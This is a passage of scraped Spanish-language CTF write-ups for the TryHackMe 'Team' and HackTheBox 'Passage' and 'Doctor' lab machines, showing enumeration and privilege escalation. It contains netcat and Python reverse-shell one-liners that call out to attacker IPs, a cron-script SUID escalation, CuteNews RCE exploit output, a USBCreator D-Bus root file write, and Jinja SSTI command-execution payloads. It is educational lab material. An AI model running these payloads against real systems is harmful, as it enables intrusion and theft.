gyles gyles@TEAM:/home/gyles$ ls -lah total 48K drwxr-xr-x 6 gyles gyles 4.0K Jan 17 19:47 . drwxr-xr-x 5 root root 4.0K Jan 15 20:21 .. -rwxr--r-- 1 gyles editors 399 Jan 15 21:52 admin_checks -rw------- 1 gyles gyles 5.6K Jan 17 20:34 .bash_history -rw-r--r-- 1 gyles gyles 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 gyles gyles 3.7K Apr 4 2018 .bashrc drwx------ 2 gyles gyles 4.0K Jan 15 21:38 .cache drwx------ 3 gyles gyles 4.0K Jan 15 21:38 .gnupg drwxrwxr-x 3 gyles gyles 4.0K Jan 15 21:51 .local -rw-r--r-- 1 gyles gyles 807 Apr 4 2018 .profile drwx------ 2 gyles gyles 4.0K Jan 15 21:43 .ssh -rw-r--r-- 1 gyles gyles 0 Jan 17 15:05 .sudo_as_admin_successful   PRIVILEGE ESCALATION Realizamos una enumeracion con el usuario Gyles y encontramos en el archivo .bash_history que se estuvieron editando varios scripts y ejecucion de shell inversas. Aparentemente algunos de los archivos son utilizados para restaurar los archivos de las paginas team.thm y dev.team.thm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  gyles@TEAM:/home/gyles$ cat .bash_history|grep \u0026#34;.sh\u0026#34; cat /etc/shells chsh -s /bin/bash nc 192.168.88.128 -e /bin/bash nc 192.168.88.128 \u0026lt; /bin/bash [ .. REDACTED ..] cat /usr/local/sbin/dev.backup.sh cat /usr/local/bin/main_backup.sh cat /opt/admin_stuff/script.sh nano /usr/local/sbin/dev.backup.sh sudo nano /usr/local/sbin/dev.backup.sh sudo nano /opt/admin_stuff/script.sh diff /usr/local/sbin/dev_backup.sh /usr/local/bin/main_backup.sh sudo chmod +x dev_backup.sh sudo rm dev.backup.sh nano dev_backup.sh nano /usr/local/bin/main_backup.sh   Ejecutamos pspy para verificar si existe un cron para la ejecucion de estos scripts. Observamos que se ejecutan varios scripts: /opt/admin_stuff/script.sh, /usr/local/sbin/dev_backup.sh y /usr/local/bin/main_backup.sh.\n1 2 3 4 5 6 7 8 9 10 11  2021/03/23 08:43:01 CMD: UID=0 PID=1569 | /bin/bash /opt/admin_stuff/script.sh 2021/03/23 08:43:01 CMD: UID=0 PID=1568 | /bin/bash /opt/admin_stuff/script.sh 2021/03/23 08:43:01 CMD: UID=0 PID=1567 | /usr/sbin/CRON -f 2021/03/23 08:43:01 CMD: UID=0 PID=1570 | cp -r /var/www/team.thm/assets /var/www/team.thm/images /var/www/team.thm/index.html /var/www/team.thm/robots.txt /var/www/team.thm/scripts /var/backups/www/team.thm/ 2021/03/23 08:43:01 CMD: UID=0 PID=1571 | /bin/bash /usr/local/sbin/dev_backup.sh 2021/03/23 08:43:01 CMD: UID=0 PID=1572 | cp -r /var/www/dev.team.thm/index.php /var/www/dev.team.thm/script.php /var/www/dev.team.thm/teamshare.php /var/backups/www/dev/ 2021/03/23 08:43:48 CMD: UID=0 PID=1573 | ps -e -o pid,ppid,state,command 2021/03/23 08:44:01 CMD: UID=0 PID=1576 | /bin/bash /usr/local/bin/main_backup.sh 2021/03/23 08:44:01 CMD: UID=0 PID=1575 | /bin/bash /opt/admin_stuff/script.sh 2021/03/23 08:44:01 CMD: UID=0 PID=1574 | /usr/sbin/CRON -f 2021/03/23 08:44:01 CMD: UID=0 PID=1577 | cp -r /var/www/team.thm/assets /var/www/team.thm/images /var/www/team.thm/index.html /var/www/team.thm/robots.txt /var/www/team.thm/scripts /var/backups/www/team.thm/   Al verificar los permisos de los scripts vemos que tenemos permisos de lectura, escritura y ejecucion en el archivo /usr/local/bin/main_backup.sh.\n1 2 3 4 5 6 7 8 9  gyles@TEAM:/home/gyles$ ls -lah /opt/admin_stuff/script.sh -rwxr--r-- 1 root root 200 Jan 17 20:38 /opt/admin_stuff/script.sh gyles@TEAM:/home/gyles$ ls -lah /usr/local/sbin/dev_backup.sh -rwxr-xr-x 1 root root 64 Jan 17 19:42 /usr/local/sbin/dev_backup.sh gyles@TEAM:/home/gyles$ ls -lah /usr/local/bin/main_backup.sh -rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh gyles@TEAM:/home/gyles$ id uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin) gyles@TEAM:/home/gyles$   Agregamos un comando para que este le de permisos SUID a bash.\n1  echo \u0026#34;chmod u+s /bin/bash\u0026#34; \u0026gt;\u0026gt; /usr/local/bin/main_backup.sh   Esperamos a que el cron se ejecute, luego de unos segundos obtiene los permisos.\ngyles@TEAM:/home/gyles$ ls -lah /bin/bash -rwxr-xr-x 1 root root 1.1M Apr 4 2018 /bin/bash gyles@TEAM:/home/gyles$ echo \u0026quot;chmod u+s /bin/bash\u0026quot; \u0026gt;\u0026gt; /usr/local/bin/main_backup.sh gyles@TEAM:/home/gyles$ ls -lah /bin/bash -rwsr-xr-x 1 root root 1.1M Apr 4 2018 /bin/bash Ejecutamos bash -p con lo que logramos obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  gyles@TEAM:/home/gyles$ bash -p bash-4.4# whoami root bash-4.4# cd bash-4.4# whoami; id; pwd root uid=1001(gyles) gid=1001(gyles) euid=0(root) groups=1001(gyles),1003(editors),1004(admin) /home/dale bash-4.4# cd /root bash-4.4# ls root.txt bash-4.4# cat root.txt THM{[... REDACTED ...]} bash-4.4#   ","description":"Team es una maquina de TryHackMe, encontramos credenciales en el servicio FTP que nos llevaron a un nuevo subdominio donde descubrimos un LFI para luego enumerar los archivos y encontrar una clave privada para acceder por SSH. Cambiamos al siguiente usuario tras ejecutar un script en bash. Escalamos privilegios editando un ficher utilizado por un CronJob.","id":17,"section":"posts","tags":["lfi","suid","php","gobuster","wfuzz"],"title":"TryHackMe - Team","uri":"https://sckull.github.io/posts/teamcw/"},{"content":"  Passage es una maquina de HackTheBox descubrimos CuteNews en donde encontramos credenciales codificadas en base64-\u0026gt;MD5, además ejecutamos una shell inversa para tener acceso. Crackeamos los hashes encontrados para acceder al siguiente usuario. Encontramos la clave publica ya registrada en authorized_keys lo que nos dio acceso a otro usuario. Tras enumerar los archivos y procesos encontramos USBCreator D-Bus Interface que además descubrimos que puede crear archivos como root lo que aprovechamos para registrar nuestra clave publica en los archivos SSH de root para obtener privilegios como root.\nInformacion de la Maquina    Nombre Passage      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.206   Maker ChefByzen    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.3, 6.4, 6.7, 3.3, 3.6], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[5, 10, 8, 2, 0], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  # Nmap 7.80 scan initiated Fri Sep 25 01:31:49 2020 as: nmap -Pn -p- --min-rate 1000 -oN allports 10.10.10.206 Warning: 10.10.10.206 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.11s latency). Not shown: 63942 closed ports, 1591 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http # Nmap done at Fri Sep 25 01:34:10 2020 -- 1 IP address (1 host up) scanned in 140.93 seconds # Nmap 7.80 scan initiated Fri Sep 25 01:34:44 2020 as: nmap -p22,80 -sC -sV -o serviceAllports 10.10.10.206 Nmap scan report for 10.10.10.206 (10.10.10.206) Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA) | 256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA) |_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Passage News Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Sep 25 01:34:55 2020 -- 1 IP address (1 host up) scanned in 10.77 seconds   HTTP Encontramos una pagina web en el puerto 80.\nAl intentar realizar una busqueda directorios y paginas con gobuster parecia que la maquina habia caido, pero segun un post de la pagina tienen implementado fail2ban, por lo que al utilizar herramientas como gobuster o hydra, fail2ban banea nuestra IP por algun tiempo.\nCUTE NEWS - RCE Explorando la pagina encontramos en el footer de esta el nombre de lo que parece ser un CMS, al investigar un poco acerca de este nombre encontramos un exploit CuteNews 2.1.2 - Remote Code Execution.\nSegun el codigo del exploit realiza una consulta a /CuteNews/cdata/users/lines donde se almacenan en base64 las credenciales de usuarios, verificamos que esta direccion exista en esta version de CMS y vemos la lista de usuarios codificados.\nEl exploit al tener las credenciales realiza un cambio del \u0026ldquo;avatar\u0026rdquo; del usuario encontrado con una webshell dentro lo que permite ejecutar comandos en la maquina. Para ello descargamos y ejecutamos el exploit, logrando ejecutar comandos como usuario www-data y ver algunos hashes de los usuarios registrados en el CMS.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48  kali@kali:~/htb/passage$ python3 CuteNews-2.1.2-RCE.py _____ __ _ __ ___ ___ ___ / ___/_ __/ /____ / |/ /__ _ _____ |_ | \u0026lt; / |_ | / /__/ // / __/ -_) / -_) |/|/ (_-\u0026lt; / __/_ / / / __/ \\___/\\_,_/\\__/\\__/_/|_/\\__/|__,__/___/ /____(_)_(_)____/ ___ _________ / _ \\/ ___/ __/ / , _/ /__/ _/ /_/|_|\\___/___/ [-\u0026gt;] Usage python3 expoit.py Enter the URL\u0026gt; http://10.10.10.206 ================================================================ Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN ================================================================ 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc ================================================================ ============================= Registering a users ============================= [+] Registration successful with username: 8g9Nqx6ATg and password: 8g9Nqx6ATg ======================================================= Sending Payload ======================================================= signature_key: 2e4f7658cee281341e4f5f36f776847b-8g9Nqx6ATg signature_dsi: 2c0343d390fbd41777bd7c348ba74773 logged in user: 8g9Nqx6ATg ============================ Dropping to a SHELL ============================ command \u0026gt; whoami www-data command \u0026gt;   Para tener una shell más comoda ejecutamos una shell inversa con python:\n1  python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.10.10.30\u0026#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39;   PAUL - USER Una vez dentro con una shell más comoda realizamos una enumeracion en la maquina pero no encontramos nada más que solo los usuarios de la maquina: paul y nadav, pero recordemos, encontramos algunos hashes (SHA256), utilizamos John y rockyou.txt para obtener algunas contraseñas.\n1 2 3 4 5 6  #HASHES 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1 4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88 e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca 4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc   O de la manera facil utilizando CrackStation.\nUna vez con las contraseñas intentamos cambiar de usuario con estas, logramos obtener una shell con el usuario Paul y nuestra flag user.txt.\nNADAV - USER Realizamos una enumeracion con este usuario y esta vez encontramos en el archivo authorized_keys la clave publica (id_rsa.pub) de nadav, por lo que este usuario puede conectarse desde su cuenta a la nuestra (paul), si ese es el caso quizas nosotros tambien a la suya.\n1 2 3 4  paul@passage:~/.ssh$ cat auth* cat auth* ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage paul@passage:~/.ssh$   Nos conectamos mediante SSH en localhost con este usuario para comprobar que nuestro usuario (paul) tambien tenga acceso al usuario nadav. Lo cual pudimos confirmar y ahora tenemos una shell con nadav.\nPRIVILEGE ESCALATION Realizamos una enumeracion en la carpeta de nadav y encontramos algo interesante en el archivo .viminfo y es que uno de los archivos que fue editado con vim es /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf. Investigamos un poco acerca de este archivo y encontramos que es posible crear archivos como usuario root utilizando USBCreator D-Bus interface lo que podria ayudarnos a escalar privilegios. Para ello verificamos que usb-creator-helper este siendo ejecutado con el usuario root.\n1 2 3 4 5  nadav@passage:~$ ps -ef |grep usb-creator ps -ef |grep usb-creator root 1992 1 0 01:04 ? 00:00:00 /usr/bin/python3 /usr/share/usb-creator/usb-creator-helper nadav 2825 2741 0 01:43 pts/20 00:00:00 grep --color=auto usb-creator nadav@passage:~$   Ahora vamos a crear un archivo en la direccion / con un archivo temporal en /tmp/test.txt y vemos que el archivo se creo en /test.txt.\n1 2 3 4 5 6 7 8 9  nadav@passage:~$ echo -n \u0026#34;USBCreator D-Bus interface\u0026#34; \u0026gt; /tmp/test.txt echo -n \u0026#34;USBCreator D-Bus interface\u0026#34; \u0026gt; /tmp/test.txt nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/test.txt /test.txt true \u0026lt;method com.ubuntu.USBCreator.Image /tmp/test.txt /test.txt true () nadav@passage:~$ ls -lah /test.txt ls -lah /test.txt -rw-r--r-- 1 root root 26 Sep 25 01:47 /test.txt nadav@passage:~$   Para obtener una shell con usuario root vamos a crear el archivo authorized_keys en la carpeta /root/.ssh/ y asi vamos a poder acceder a este usuario mediante SSH de la misma forma que con nadav. Primero vamos a copiar el archivo id_rsa.pub del usuario actual a /tmp/authorized_keys, luego creamos el archivo:\n1  gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /tmp/authorized_keys /root/.ssh/authorized_keys true   Nos conectamos por medio de SSH y logramos obtener una shell y nuestra flag root.txt.\n","description":"Passage es una maquina de HackTheBox descubrimos CuteNews en donde encontramos credenciales codificadas en base64-MD5, además ejecutamos una shell inversa para tener acceso. Crackeamos los hashes encontrados para acceder al siguiente usuario. Encontramos la clave publica ya registrada en authorized_keys lo que nos dio acceso a otro usuario. Tras enumerar los archivos y procesos encontramos USBCreator D-Bus Interface que además descubrimos que puede crear archivos como root lo que aprovechamos para registrar nuestra clave publica en los archivos SSH de root para obtener privilegios como root.","id":18,"section":"posts","tags":["cute news cms","usbcreator d bus","rce"],"title":"Hack The Box - Passage","uri":"https://sckull.github.io/posts/passage/"},{"content":"  Doctor expone una aplicacion web en donde encontramos y explotamos una vulnerabilidad de Server Side Template Injection (SSTI) en Python lo que nos permitio obtener acceso. Los Logs de Apache nos permitieron leer la contraseña del siguiente usuario. Explotamos una vulnerabilidad en Splunk lo que nos permitio obtener acceso privilegiado.\nInformacion de la Maquina    Nombre Doctor      OS Linux   Puntos 20   Dificultad Facil   IP 10.10.10.209   Maker egotisticalSW    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User Rate\u0026quot;, \u0026quot;data\u0026quot;:[6.4, 5.9, 5.8, 4.2, 4.1], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(75, 162, 189,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#4ba2bd\u0026quot; }, { \u0026quot;label\u0026quot;:\u0026quot;Maker Rate\u0026quot;, \u0026quot;data\u0026quot;:[7, 8, 7, 3, 2], \u0026quot;backgroundColor\u0026quot;:\u0026quot;rgba(154, 204, 20,0.5)\u0026quot;, \u0026quot;borderColor\u0026quot;:\u0026quot;#9acc14\u0026quot; } ] }, \u0026quot;options\u0026quot;: {\u0026quot;scale\u0026quot;: {\u0026quot;ticks\u0026quot;: {\u0026quot;backdropColor\u0026quot;:\u0026quot;rgba(0,0,0,0)\u0026quot;}, \u0026quot;angleLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;}, \u0026quot;gridLines\u0026quot;:{\u0026quot;color\u0026quot;:\u0026quot;rgba(255, 255, 255,0.6)\u0026quot;} } } }     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto ssh (22), http (80) y el puerto ssl-https(?) (8089) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  # Nmap 7.80 scan initiated Wed Dec 30 18:17:55 2020 as: nmap -p- --min-rate 1000 -o scanPorts doctor.htb Nmap scan report for doctor.htb (10.10.10.209) Host is up (0.15s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 8089/tcp open unknown # Nmap done at Wed Dec 30 18:20:06 2020 -- 1 IP address (1 host up) scanned in 131.59 seconds # Nmap 7.80 scan initiated Wed Dec 30 18:20:46 2020 as: nmap -sV -sC -p22,80,8089 -o servicePorts doctor.htb Nmap scan report for doctor.htb (10.10.10.209) Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open ssl/http Splunkd httpd | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after: 2023-09-06T15:57:27 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Wed Dec 30 18:21:28 2020 -- 1 IP address (1 host up) scanned in 42.04 seconds   HTTP - PUERTO 80 Encontramos una pagina web en el puerto 80, en esta pagina vemos tambien un dominio doctors.htb el cual agregamos junto al que ya teniamos.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos, pero al parecer es una pagina estatica.\n1 2 3 4 5 6 7 8 9 10 11 12 13  kali@kali:~/htb/doctor$ gobuster dir -u http://doctor.htb/ -w /usr/share/wordlists/dirb/common.txt -q -x php,html,txt -t 25 /about.html (Status: 200) /blog.html (Status: 200) /contact.html (Status: 200) /css (Status: 301) /departments.html (Status: 200) /fonts (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /server-status (Status: 403) /services.html (Status: 200)   HTTPS - PUERTO 8089 En este puerto encontramos una \u0026ldquo;pagina\u0026rdquo; donde vemos Splunk en su version web: Splunk build 8.0.5. Tambien un post donde describe una vulnerabilidad en este \u0026ldquo;servicio\u0026rdquo; que permite ejecutar comandos, utilizamos el exploit remoto con las credenciales por default pero no logramos obtener ninguna respuesta, por lo que es necesario obtener credenciales.\nDOCTORS Con el dominio nuevo, encontramos un login, donde registramos un usuario y en la pagina inicial vemos una opcion de escribir mensajes que solo presentan contenido y titulo en la pagina principal.\nUtilizando BurpSuite dentro de las respuestas pudimos encontrar que es una aplicacion escrita en Python, además ejecutamos Gobuster para buscar diferentes rutas dentro de la aplicacion. Vemos /archive una direccion que no aparece relacionada en ninguna opcion del menu de la aplicacion.\n1 2 3 4 5 6 7 8 9  kali@kali:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2$ gobuster dir -u http://doctors.htb/ -w /usr/share/wordlists/dirb/big.txt -q -x php,html,txt -t 35 -k /account (Status: 302) /archive (Status: 200) /home (Status: 302) /login (Status: 200) /logout (Status: 302) /register (Status: 200) /reset_password (Status: 200) /server-status (Status: 403)   La ultima direccion mencionada no tiene ningun tipo de contenido pero al verificar el codigo fuente vemos XML donde se ve reflejado el titulo del Mensaje que creamos, por lo que quizá sea vulnerable a XXE Injection en la etiqueta \u0026lt;title\u0026gt;PAYLOAD\u0026lt;/title\u0026gt;.\n1 2 3 4 5 6 7  \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;Archive\u0026lt;/title\u0026gt; \u0026lt;item\u0026gt;\u0026lt;title\u0026gt;Doctor\u0026lt;/title\u0026gt;\u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt;\t  Intentamos con XXE con diferentes \u0026ldquo;payloads\u0026rdquo; en el titulo pero no retornaba ningun valor. Luego de explorar algunas vulnerabilidades \u0026ldquo;parecidas\u0026rdquo; encontramos Server Side Template Injection - Jinja en Python, utilizando los diferentes Payloads iniciales, vemos valores retornados.\n1  {{4*4}}[[5*5]]   Tambien logramos obtener un poco de informacion como la direccion de la base de datos, la direccion de la aplicacion, su codigo fuente y el contenido de la base de datos, ejecutando algunos comandos con un payload para ejecucion de estos.\nbash xml bash python  #configuracion {{config.items()}} #Ejecucion de comandos {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}   1 2 3 4 5 6 7 8  \u0026lt;!-- Direccion /archive --\u0026gt; \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; ?\u0026gt; \u0026lt;rss version=\u0026#34;2.0\u0026#34;\u0026gt; \u0026lt;channel\u0026gt; \u0026lt;title\u0026gt;Archive\u0026lt;/title\u0026gt; \u0026lt;item\u0026gt;\u0026lt;title\u0026gt;dict_items([(\u0026#39;ENV\u0026#39;, \u0026#39;production\u0026#39;), (\u0026#39;DEBUG\u0026#39;, False), (\u0026#39;TESTING\u0026#39;, False), (\u0026#39;PROPAGATE_EXCEPTIONS\u0026#39;, None), (\u0026#39;PRESERVE_CONTEXT_ON_EXCEPTION\u0026#39;, None), (\u0026#39;SECRET_KEY\u0026#39;, \u0026#39;1234\u0026#39;), (\u0026#39;PERMANENT_SESSION_LIFETIME\u0026#39;, datetime.timedelta(days=31)), (\u0026#39;USE_X_SENDFILE\u0026#39;, False), (\u0026#39;SERVER_NAME\u0026#39;, None), (\u0026#39;APPLICATION_ROOT\u0026#39;, \u0026#39;/\u0026#39;), (\u0026#39;SESSION_COOKIE_NAME\u0026#39;, \u0026#39;session\u0026#39;), (\u0026#39;SESSION_COOKIE_DOMAIN\u0026#39;, False), (\u0026#39;SESSION_COOKIE_PATH\u0026#39;, None), (\u0026#39;SESSION_COOKIE_HTTPONLY\u0026#39;, True), (\u0026#39;SESSION_COOKIE_SECURE\u0026#39;, False), (\u0026#39;SESSION_COOKIE_SAMESITE\u0026#39;, None), (\u0026#39;SESSION_REFRESH_EACH_REQUEST\u0026#39;, True), (\u0026#39;MAX_CONTENT_LENGTH\u0026#39;, None), (\u0026#39;SEND_FILE_MAX_AGE_DEFAULT\u0026#39;, datetime.timedelta(seconds=43200)), (\u0026#39;TRAP_BAD_REQUEST_ERRORS\u0026#39;, None), (\u0026#39;TRAP_HTTP_EXCEPTIONS\u0026#39;, False), (\u0026#39;EXPLAIN_TEMPLATE_LOADING\u0026#39;, False), (\u0026#39;PREFERRED_URL_SCHEME\u0026#39;, \u0026#39;http\u0026#39;), (\u0026#39;JSON_AS_ASCII\u0026#39;, True), (\u0026#39;JSON_SORT_KEYS\u0026#39;, True), (\u0026#39;JSONIFY_PRETTYPRINT_REGULAR\u0026#39;, False), (\u0026#39;JSONIFY_MIMETYPE\u0026#39;, \u0026#39;application/json\u0026#39;), (\u0026#39;TEMPLATES_AUTO_RELOAD\u0026#39;, None), (\u0026#39;MAX_COOKIE_SIZE\u0026#39;, 4093), (\u0026#39;MAIL_PASSWORD\u0026#39;, \u0026#39;doctor\u0026#39;), (\u0026#39;MAIL_PORT\u0026#39;, 587), (\u0026#39;MAIL_SERVER\u0026#39;, \u0026#39;\u0026#39;), (\u0026#39;MAIL_USERNAME\u0026#39;, \u0026#39;doctor\u0026#39;), (\u0026#39;MAIL_USE_TLS\u0026#39;, True), (\u0026#39;SQLALCHEMY_DATABASE_URI\u0026#39;, \u0026#39;sqlite://///home/web/blog/flaskblog/site.db\u0026#39;), (\u0026#39;WTF_CSRF_CHECK_DEFAULT\u0026#39;, False), (\u0026#39;SQLALCHEMY_BINDS\u0026#39;, None), (\u0026#39;SQLALCHEMY_NATIVE_UNICODE\u0026#39;, None), (\u0026#39;SQLALCHEMY_ECHO\u0026#39;, False), (\u0026#39;SQLALCHEMY_RECORD_QUERIES\u0026#39;, None), (\u0026#39;SQLALCHEMY_POOL_SIZE\u0026#39;, None), (\u0026#39;SQLALCHEMY_POOL_TIMEOUT\u0026#39;, None), (\u0026#39;SQLALCHEMY_POOL_RECYCLE\u0026#39;, None), (\u0026#39;SQLALCHEMY_MAX_OVERFLOW\u0026#39;, None), (\u0026#39;SQLALCHEMY_COMMIT_ON_TEARDOWN\u0026#39;, False), (\u0026#39;SQLALCHEMY_TRACK_MODIFICATIONS\u0026#39;, None), (\u0026#39;SQLALCHEMY_ENGINE_OPTIONS\u0026#39;, {})])\u0026lt;/title\u0026gt;\u0026lt;/item\u0026gt; \u0026lt;/channel\u0026gt;     1 2  #!/bin/bash SECRET_KEY=1234 SQLALCHEMY_DATABASE_URI=sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py     1 2 3 4 5 6  from flaskblog import create_app app = create_app() if __name__ == __main__: app.run(debug=False)       'use strict'; var containerId = JSON.parse(\"\\\"78b156bd95e1f355\\\"\"); var containerElem = document.getElementById(containerId); var codetabLinks = null; var codetabContents = null; var ids = []; if (containerElem) { codetabLinks = containerElem.querySelectorAll('.codetab__link'); codetabContents = containerElem.querySelectorAll('.codetab__content'); } for (var i = 0; i 0) { codetabContents[0].style.display = 'block'; }  En la base de datos encontramos el Post donde vemos el contenido de nuestro payload para realizar la lectura del archivo de base de datos, tambien vemos nuestro usuario con la informacion de registro y autenticacion, tambien el usuario admin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  kali@kali:~/htb/doctor$ sqlite3 site.db SQLite version 3.33.0 2020-08-14 13:23:32 Enter \u0026#34;.help\u0026#34; for usage hints. sqlite\u0026gt; .databases main: /home/kali/htb/doctor/site.db sqlite\u0026gt; .tables post user sqlite\u0026gt; select * from post; 1|Doctor blog|2020-09-18 20:48:37.55555|A free blog to share medical knowledge. Be kind!|1 2|{{config.__class__.__init__.__globals__[\u0026#39;os\u0026#39;].popen(\u0026#39;cat /home/web/blog/flaskblog/site.db|base64\u0026#39;).read()}}|2020-12-31 01:44:15.772119|doctor |2 sqlite\u0026gt; select * from user; 